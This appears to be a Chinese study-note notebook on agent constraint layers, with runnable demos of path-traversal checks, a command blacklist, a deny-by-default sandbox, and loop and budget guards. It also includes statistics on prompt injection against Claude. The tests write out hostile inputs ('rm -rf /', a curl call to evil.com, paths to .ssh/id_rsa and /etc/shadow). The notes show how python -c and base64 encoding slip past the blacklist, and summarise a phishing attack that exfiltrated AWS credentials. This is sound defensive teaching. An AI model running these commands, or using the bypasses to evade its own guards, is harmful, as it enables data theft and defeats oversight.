# Agent 循环与约束层（Harness Engineering 学习笔记）

> 素材来源：《Harness Engineering 实战：构建可靠的生产级 AI Agent》第 3 章，配套代码仓库 [harness-py-book](https://github.com/Luxuzhou/harness-py-book)；工业界佐证来自 [Anthropic 官方工程博客：How we contain Claude across products](https://www.anthropic.com/engineering/how-we-contain-claude)。
>
> 本笔记只讲两件事：**原理**（为什么这样设计）与**做法**（如何在自己的 Agent 里实现）。每个概念配一个可直接运行的最小 demo（无需 API Key）。

**先记住一句话：模型是概率系统，约束层是确定性系统。Agent 的可靠性由确定性部分兜底。**

| 事实 | 推论 |
|---|---|
| 单步成功率 95% 的 Agent，连续 20 步后整体成功率仅 0.95²⁰ ≈ **36%** | 链式失败填不平，唯有 harness 的验证/恢复/约束能攻击链条本身 |
| 同一模型换更好的 harness，编码基准最高提升 **10 倍**（2026 年行业调查） | 当换"盒子"比换"引擎"更有效，工程重点就在盒子上 |
| LangChain 公式：**Agent = Model + Harness** | Harness 是工具、规则、权限、检查、日志的总和 |

## 1. 最小 Agent 循环：约束层在哪里起作用

Agent 的本质是一个循环：模型要么输出文字（结束），要么请求工具（继续）。循环骨架只有 5 步：

**① 用户任务 → ② 模型调用 → ③ 工具调用解析 → ④ 工具执行 → ⑤ 结果回填上下文 → 回到 ②**

约束层的位置在 **③ 与 ④ 之间**：所有工具调用必须经过同一个检查点（choke point，单点强制）。这是全部安全设计的第一原则——**没有旁路**。

<div style="text-align:center"><img src="../src/agent_loop_constraint.svg" width="820"/></div>

两个关键认知：
1. **拒绝不是终点，是反馈**。拦截时返回结构化原因（如「敏感路径保护： ../.ssh/id_rsa」），模型读到原因后下一轮会主动改走合规路线——这就是「约束即效率」。
2. **循环必须有上限**。`max_iterations` 与成本熔断是最廉价的约束，写在循环的 `for` 上即可。

In [6]:
# ===== Demo 1：最小 Agent 循环骨架（约 30 行，无 API 依赖）=====
from dataclasses import dataclass, field

# ---- 工具注册表：真实实现里每个工具都要过约束层 ----
TOOLS = {
    "read_file":  lambda a: f"[内容] {a['path']} 的文件内容……",
    "write_file": lambda a: f"已写入 {a['path']}",
    "bash":       lambda a: f"[输出] 命令 {a['command']} 执行成功",
}

def call_model(messages):
    """伪模型：演示循环结构用。真实场景替换为 OpenAI 兼容 API。"""
    if not any(m["role"] == "tool" for m in messages):
        # 第一轮：模型请求读文件
        return {"role": "assistant",
                "tool_calls": [{"name": "read_file", "arguments": {"path": "src/main.py"}}]}
    # 第二轮：已拿到工具结果 → 给出最终回答
    return {"role": "assistant", "content": "文件已读取，任务完成。"}

def run_agent_loop(task: str, max_iterations: int = 5):
    """约束即效率的第 0 步：给循环一个硬上限。"""
    messages = [{"role": "user", "content": task}]
    for i in range(1, max_iterations + 1):
        resp = call_model(messages)
        if "tool_calls" not in resp:                 # 模型不再请求工具 → 结束
            print(f"[第{i}轮] 结束: {resp['content']}")
            return resp["content"]
        for tc in resp["tool_calls"]:                # ③ 解析工具调用
            # ★ 约束层检查点：真实实现里在这里调用 sandbox.check_tool_call()
            result = TOOLS[tc["name"]](tc["arguments"])   # ④ 执行
            messages.append({"role": "tool", "name": tc["name"], "content": result})  # ⑤ 回填
            print(f"[第{i}轮] {tc['name']}({tc['arguments']}) -> {result}")
    return "已达到最大轮数，熔断"

run_agent_loop("帮我看看 src/main.py")

[第1轮] read_file({'path': 'src/main.py'}) -> [内容] src/main.py 的文件内容……
[第2轮] 结束: 文件已读取，任务完成。


'文件已读取，任务完成。'

## 2. 检查层：三道基础防线

在检查点处用**确定性代码**做三类检查。这是成本最低、收益最大的一层（书中表 3-5：规则层+检查层贡献了大部分拦截率）。

### 2.1 路径安全：`check_path_escape`

**原理**：`Path.resolve()` 会消解 `..`、符号链接、冗余路径段，得到真实绝对路径 → 检查它是否仍在工作区内。
**反模式**：不要用字符串前缀匹配判断路径——`src/../..` 、URL 编码、符号链接都能骗过字符串检查；`resolve()` 后比较是唯一可靠做法。

In [7]:
# ===== Demo 2：路径安全检查（防路径穿越）=====
from pathlib import Path

def check_path_escape(cwd: Path, path: str) -> tuple[bool, str]:
    """resolve() 消除 .. 与符号链接后，必须仍落在 cwd 内。对应书 3.2.1。"""
    try:
        p = (cwd / path).resolve()
    except OSError as e:
        return False, f"非法路径: {e}"
    if not p.is_relative_to(cwd.resolve()):
        return False, f"路径穿越: {path} -> {p}"
    return True, ""

cwd = Path.cwd()
for path in ["src/main.py",            # 正常相对路径
             "../../etc/passwd",       # 经典穿越
             "/etc/shadow",            # 绝对路径
             "src/../../.ssh/id_rsa"]: # 混合穿越
    ok, reason = check_path_escape(cwd, path)
    print(f"{path:24s} -> {'ALLOW' if ok else 'BLOCK'}   {reason}")

src/main.py              -> ALLOW   
../../etc/passwd         -> BLOCK   路径穿越: ../../etc/passwd -> D:\dev\etc\passwd
/etc/shadow              -> BLOCK   路径穿越: /etc/shadow -> D:\etc\shadow
src/../../.ssh/id_rsa    -> BLOCK   路径穿越: src/../../.ssh/id_rsa -> D:\dev\Developing-LLM-Powered-Translation-Applications\.ssh\id_rsa


### 2.2 危险命令拦截：黑名单及其盲区

**原理**：正则黑名单覆盖不可逆破坏操作（`rm -rf`、`mkfs`、`dd of=/dev/`、`git push --force`……）。
**为什么黑名单必要但不充分**：Agent 会用脚本、编码等方式绕过——书中第二轮实验实证了这一点。看 demo：

In [8]:
# ===== Demo 3：命令黑名单的拦截与绕过（书 3.2.2 / 3.3 第二轮）=====
import re

DESTRUCTIVE = [re.compile(p, re.I) for p in [
    r"\brm\s+(-[rf]+\s+)*(\/|\.|\*)",   # rm -rf / . *
    r"\bmkfs\b",                                  # 格式化
    r"\bdd\s+.*of=/dev/",                        # 写裸设备
    r"\bchmod\s+-R\s+777\s+/",                  # 全开权限
    r"\bgit\s+push\s+.*--force\b",              # 强推
    r"\bgit\s+reset\s+--hard\b",                # 丢工作区
]]

def check_command(cmd: str) -> tuple[bool, str]:
    for pat in DESTRUCTIVE:
        if pat.search(cmd):
            return False, f"危险命令拦截"
    return True, ""

cases = [
    ("rm -rf /",                                       "直接破坏 —— 被拦截"),
    ("git push --force",                               "强推远端 —— 被拦截"),
    ('python -c "import os; os.remove(\'data.db\')"',  "间接绕过！黑名单看不见"),
    ("echo cm0gLXJmIC90bXA= | base64 -d",              "编码绕过！解码后才危险"),
]
for cmd, desc in cases:
    ok, _ = check_command(cmd)
    print(f"{'ALLOW' if ok else 'BLOCK':6s} | {desc:22s} | {cmd[:44]}")

print()
print("结论: 黑名单挡得住'明文直球'，挡不住间接与编码 —— 所以需要白名单思想（下一节沙箱）")

BLOCK  | 直接破坏 —— 被拦截            | rm -rf /
BLOCK  | 强推远端 —— 被拦截            | git push --force
ALLOW  | 间接绕过！黑名单看不见            | python -c "import os; os.remove('data.db')"
ALLOW  | 编码绕过！解码后才危险            | echo cm0gLXJmIC90bXA= | base64 -d

结论: 黑名单挡得住'明文直球'，挡不住间接与编码 —— 所以需要白名单思想（下一节沙箱）


### 2.3 三轮实验：从零防护到纵深防护

仓库 `examples/ch03_safety_demo.py` 用三轮迭代复现了约束层的必要性：

| 轮次 | 配置 | 结果 | 教训 |
|---|---|---|---|
| 第 1 轮 | 零约束（权限全开） | 4 种攻击全部放行 | 没有边界的 Agent 什么都会做 |
| 第 2 轮 | 命令黑名单 | 直接攻击被拦；`python -c` 与 base64 编码**绕过成功** | 黑名单是必要但不充分的 |
| 第 3 轮 | 框架级路径检查 + 黑名单 | 路径穿越/绝对路径/Unicode 遍历全部拦截 | 白名单 + resolve() 才可靠 |

**做法总结**：先黑名单（拦已知危险）→ 再路径白名单（拦越界）→ 最后沙箱 deny-by-default（拦未知）。

## 3. 沙箱层：从「不许做」到「做不到」

规则层/检查层的本质是**告诉 Agent 不许做**——模型可能忽略、注入可以覆盖、黑名单有盲区。
沙箱层的本质是**让 Agent 做不到**：默认拒绝一切，只显式放行白名单。这是 deny-by-default 与黑名单的本质区别。

<div style="text-align:center"><img src="../src/defense_in_depth.svg" width="820"/></div>

### 3.1 四步检查流水线

`Sandbox.check_tool_call(tool_name, tool_args)` 把所有检查收拢到一个入口，**串联执行、任一失败立即拒绝**（fail-closed）：

<div style="text-align:center"><img src="../src/sandbox_pipeline.svg" width="820"/></div>

三个值得注意的工程细节：
- **NetworkPolicy**：`deny_by_default=True` + `allowed_hosts` 白名单；同时剥离 `HTTP_PROXY` 等代理环境变量——防数据经代理外泄。
- **FilesystemPolicy**：分层判断——敏感路径（`.ssh/`、`.aws/credentials`、`.git/config`）**不可覆盖**地拒绝 → `allowed_roots` 白名单 → 额外黑名单 → 符号链接拦截。
- **确认超时 = 拒绝**：ASK 模式下用户 30 秒不确认视为拒绝。防止无人值守时 Agent 永久阻塞，也防止"等 approve"式绕过。

### 3.2 四种权限模式（对齐 Claude Code）

| 模式 | 读 | 写 | 执行/联网 | 适用场景 |
|---|---|---|---|---|
| `PLAN` | ✅ | ❌ | ❌ | 规划与代码审查，零风险 |
| `ASK`（默认） | ✅ | 确认 | 确认 | 敏感环境/初次运行 |
| `ACCEPT` | ✅ | ✅ | 确认 | 日常开发，减少打断 |
| `BYPASS` | ✅ | ✅ | ✅ | **仅限**容器/可信沙箱内 |

经验法则（Anthropic 数据支撑）：**人审是靠不住的**——用户会批准 93% 的权限弹窗。与其弹更多窗，不如收窄环境边界，让弹窗只出现在真正需要人的地方。

In [9]:
# ===== Demo 4：MiniSandbox —— 四步检查流水线（书 3.4 的可运行简化版）=====
import re
from dataclasses import dataclass, field
from pathlib import Path

@dataclass
class MiniSandbox:
    """deny-by-default 沙箱：权限模式 → 文件系统 → 网络 → 危险命令。"""
    cwd: Path
    permission_mode: str = "ask"              # plan / ask / accept / bypass
    allowed_roots: list = field(default_factory=list)
    deny_network: bool = True
    user_confirm: object = None               # (action, detail) -> bool，None 视为拒绝

    def check_tool_call(self, tool: str, args: dict) -> tuple[bool, str]:
        action = {"read_file": "read", "write_file": "write"}.get(tool, "execute")

        # ---- Step 1 权限模式 ----
        if self.permission_mode == "plan" and action != "read":
            return False, f"PLAN 模式只许读，拒绝 {action}"
        if self.permission_mode in ("ask", "accept") and (
            action != "read" and not (self.permission_mode == "accept" and action == "write")
        ):
            if not (self.user_confirm and self.user_confirm(action, f"{tool}({args})")):
                return False, f"需用户确认但未获批准（fail-closed）"

        # ---- Step 2 文件系统策略 ----
        if "path" in args:
            p = (self.cwd / args["path"]).resolve()
            unix = str(p).replace("\\", "/")
            if not p.is_relative_to(self.cwd.resolve()):
                return False, f"路径穿越: {args['path']}"
            if "/.ssh/" in unix or p.name in {".env", "id_rsa", "credentials.json"}:
                return False, f"敏感路径保护: {args['path']}"
            if self.allowed_roots and not any(
                p.is_relative_to(Path(r).resolve()) for r in self.allowed_roots
            ):
                return False, f"不在允许根目录内: {args['path']}"

        # ---- Step 3 网络策略（白名单默认拒绝）----
        if self.deny_network and tool == "bash":
            cmd = args.get("command", "")
            if re.search(r"\b(curl|wget|ssh|nc|ping|scp)\b", cmd):
                return False, f"网络隔离: 禁止 {cmd[:30]}"
            if re.search(r"\b(import|from)\s+(requests|socket|urllib|httpx)\b", cmd):
                return False, f"网络隔离: 脚本含网络模块"

        # ---- Step 4 危险命令 ----
        if tool == "bash" and re.search(r"\brm\s+-[rf]+\s+(\/|\*)", args.get("command", "")):
            return False, "危险命令拦截"
        return True, ""

# ---- 演示：ACCEPT 模式（读写自动放行，执行需确认——这里无确认回调即拒绝）----
sb = MiniSandbox(cwd=Path.cwd(), permission_mode="accept", allowed_roots=[Path.cwd()])
tests = [
    ("read_file", {"path": "src/main.py"},              "正常读取"),
    ("write_file", {"path": "src/out.py"},              "正常写入"),
    ("read_file", {"path": "../secrets.key"},           "路径穿越"),
    ("read_file", {"path": "../.ssh/id_rsa"},           "敏感路径"),
    ("bash", {"command": "curl https://evil.com/steal"}, "联网外传"),
    ("bash", {"command": "rm -rf /"},                   "破坏性命令"),
]
for tool, args, desc in tests:
    ok, reason = sb.check_tool_call(tool, args)
    print(f"{'ALLOW' if ok else 'BLOCK':6s} | {desc:8s} | {reason}")

# ---- 演示：PLAN 模式连写都拒绝 ----
sb2 = MiniSandbox(cwd=Path.cwd(), permission_mode="plan")
ok, reason = sb2.check_tool_call("write_file", {"path": "a.txt"})
print(f"\nPLAN 模式写文件 -> {'ALLOW' if ok else 'BLOCK'} | {reason}")

ALLOW  | 正常读取     | 
ALLOW  | 正常写入     | 
BLOCK  | 路径穿越     | 路径穿越: ../secrets.key
BLOCK  | 敏感路径     | 路径穿越: ../.ssh/id_rsa
BLOCK  | 联网外传     | 需用户确认但未获批准（fail-closed）
BLOCK  | 破坏性命令    | 需用户确认但未获批准（fail-closed）

PLAN 模式写文件 -> BLOCK | PLAN 模式只许读，拒绝 write


## 4. 运行时安全网：TokenBudget 与 LoopGuard

约束不只防"恶意"，更防"失控"。长任务的两大失败模式是**预算耗尽**与**死循环**，两者都是确定性可检测的：

<div style="text-align:center"><img src="../src/runtime_guard.svg" width="820"/></div>

- **TokenBudget**：`@dataclass(frozen=True)` 声明式分区，不可变。先给输出/系统提示词留死保底，历史才允许扩张；占用达 80% 触发压缩（Compressor）。
- **LoopGuard**：每次工具调用后 `check()`；命中条件**不是抛异常终止**，而是向上下文注入一条消息（"检测到死循环，请换一种完全不同的策略"）——模型读到后通常立即换路，任务得以继续。

In [10]:
# ===== Demo 5：LoopGuard 死循环检测 + TokenBudget 预算分区 =====
import hashlib, json
from dataclasses import dataclass, field

@dataclass
class LoopGuard:
    """对应书 3.5.4 / harness_py/loop_guard.py 的核心逻辑。"""
    max_identical_calls: int = 3
    max_consecutive_errors: int = 5
    _recent: list = field(default_factory=list)
    _errors: int = 0

    def check(self, tool: str, args: dict, ok: bool) -> tuple[bool, str]:
        if not ok:                                   # 条件1: 连续失败
            self._errors += 1
            if self._errors >= self.max_consecutive_errors:
                return True, f"已连续{self._errors}次失败，请换方法"
        else:
            self._errors = 0
        sig = tool + ":" + hashlib.md5(              # 条件2: 完全相同调用(MD5签名)
            json.dumps(args, sort_keys=True).encode()).hexdigest()[:8]
        self._recent.append(sig)
        self._recent = self._recent[-10:]            # 滑动窗口只留最近10条
        tail = self._recent[-self.max_identical_calls:]
        if len(tail) == self.max_identical_calls and len(set(tail)) == 1:
            return True, f"检测到死循环: 连续{self.max_identical_calls}次相同调用"
        return False, ""

print("场景1: 反复读同一文件")
g = LoopGuard()
for i in range(1, 5):
    hit, msg = g.check("read_file", {"path": "config.json"}, ok=True)
    print(f"  第{i}次 -> {'介入: ' + msg if hit else '正常'}")

print("场景2: 连续失败后成功会清零")
g2 = LoopGuard(max_consecutive_errors=3)
for i in range(1, 5):
    hit, msg = g2.check("bash", {"command": f"run_{i}.py"}, ok=False)
    print(f"  第{i}次失败 -> {'介入: ' + msg if hit else '继续计数'}")

@dataclass(frozen=True)                              # frozen: 预算声明后不可变
class TokenBudget:
    """对应书 3.5.3：128K 窗口的声明式分区。"""
    history: int; current_task: int; output: int; system: int; memory: int

    @classmethod
    def allocate(cls, context_window: int = 128_000) -> "TokenBudget":
        return cls(
            history=int(context_window * 0.50),
            current_task=int(context_window * 0.20),
            output=int(context_window * 0.15),       # 死保底: 没有输出区模型连话都说不完
            system=int(context_window * 0.10),
            memory=int(context_window * 0.05),
        )

b = TokenBudget.allocate()
print(f"\nTokenBudget(128K): 历史{b.history//1000}K + 任务{b.current_task//1000}K"
      f" + 输出{b.output//1000}K + 系统{b.system//1000}K + 记忆{b.memory//1000}K")
assert b.history + b.current_task + b.output + b.system + b.memory == 128_000
print("分区总和校验通过; 运行逻辑: 占用 >80% 触发压缩, max_cost_usd/max_iterations 双熔断")

场景1: 反复读同一文件
  第1次 -> 正常
  第2次 -> 正常
  第3次 -> 介入: 检测到死循环: 连续3次相同调用
  第4次 -> 介入: 检测到死循环: 连续3次相同调用
场景2: 连续失败后成功会清零
  第1次失败 -> 继续计数
  第2次失败 -> 继续计数
  第3次失败 -> 介入: 已连续3次失败，请换方法
  第4次失败 -> 介入: 已连续4次失败，请换方法

TokenBudget(128K): 历史64K + 任务25K + 输出19K + 系统12K + 记忆6K
分区总和校验通过; 运行逻辑: 占用 >80% 触发压缩, max_cost_usd/max_iterations 双熔断


## 5. 工业界印证：Anthropic 踩过的坑

以下事实来自 [Anthropic 工程博客《How we contain Claude across products》（2026-05）](https://www.anthropic.com/engineering/how-we-contain-claude)，与本书结论完全一致：

| Anthropic 实测事实 | 对应本书的结论 |
|---|---|
| 用户批准了 **93%** 的权限弹窗（审批疲劳） | 人审靠不住 → 环境约束 + 自动化审批 |
| 钓鱼让 Claude 读取 `~/.aws/credentials` 并外传，**25 次尝试成功 24 次** | 用户本身就是注入向量；模型层防御锚定"用户意图"，此时完全失效；**唯一有效的防线是环境**（出站控制 + 文件边界） |
| 引入 OS 级沙箱（macOS Seatbelt / Linux bubblewrap）后，权限弹窗**减少 84%** | "约束即效率"：收窄边界反而减少打断、提升产出 |
| 3 个漏洞都打在**信任对话框之前**（启动时解析项目配置即执行 hook） | 信任边界必须先于一切输入建立；项目配置 = 互联网输入 |
| 模型层防御再强也无法 100%（Opus 4.7 单次注入成功率约 0.1%，100 次自适应攻击后 5-6%） | 概率防线不能单独使用，必须叠加确定性环境层 |

Anthropic 把风险归为三类（用户误用 / 模型不当行为 / 外部攻击者），防御对象归为三个组件（**模型、环境、外部内容**），并明确结论：**环境层是唯一能提供硬边界的层**——这正是本书"沙箱层"的定位。

## 6. 如何做：渐进式落地清单

不要试图一次建成生产级约束层。按 L0→L3 渐进采用，每一步都对应本笔记的一个 demo：

| 层级 | 做什么 | 对应 demo / 机制 | 花费 |
|---|---|---|---|
| **L0 立即做** | 循环上限 + 成本熔断；危险命令黑名单；所有子进程加超时 | Demo 1 / Demo 3 | 10 分钟 |
| **L1 第一天** | 所有文件工具接入 `check_path_escape`；固定检查点（无旁路） | Demo 2 | 半天 |
| **L2 第一周** | 权限模式（PLAN/ASK/ACCEPT）；网络默认拒绝；文件白名单 + 敏感路径保护；LoopGuard；TokenBudget | Demo 4 / Demo 5 | 1-2 天 |
| **L3 生产前** | 容器隔离；拦截率统计与回归测试；结构化拒绝原因 | 见下方命令 | 视情况 |

生产级容器隔离（书 3.4.5）：

```bash
docker run --rm --network=none \
  --memory=512m --pids-limit=256 \
  --cap-drop=ALL --security-opt no-new-privileges \
  -v "$PWD/workspace:/work:rw" my-agent-image
```

每层的检查逻辑都要有**单元测试**（仓库 `tests/` 有 226 项测试可参考）：约束层是确定性代码，完全可测；一段"没有被测试保护的安全检查"约等于没有。

## 7. 核心结论

1. **单点强制**：所有工具调用过同一个检查点，没有旁路。
2. **deny-by-default**：黑名单拦已知，白名单拦未知；沙箱让"做不到"取代"不许做"。
3. **拒绝即反馈**：结构化的拒绝原因让模型自纠偏——约束提升而非降低任务效率。
4. **fail-closed**：超时、异常、未知情况一律按拒绝处理。
5. **确定性兜底概率性**：模型层防御永远有失手率，环境层才有硬边界。

## 参考来源

- 《Harness Engineering 实战》第 3 章 + [harness-py-book](https://github.com/Luxuzhou/harness-py-book)（`harness_py/sandbox.py`、`loop_guard.py`、`examples/ch03_safety_demo.py`）
- [Anthropic Engineering: How we contain Claude across products](https://www.anthropic.com/engineering/how-we-contain-claude)
- [Harness Engineering: A Crash Course](https://agentfactory.piaic.org/docs/harness-engineering-crash-course)（95²⁰≈36%、10x harness 收益等数据出处）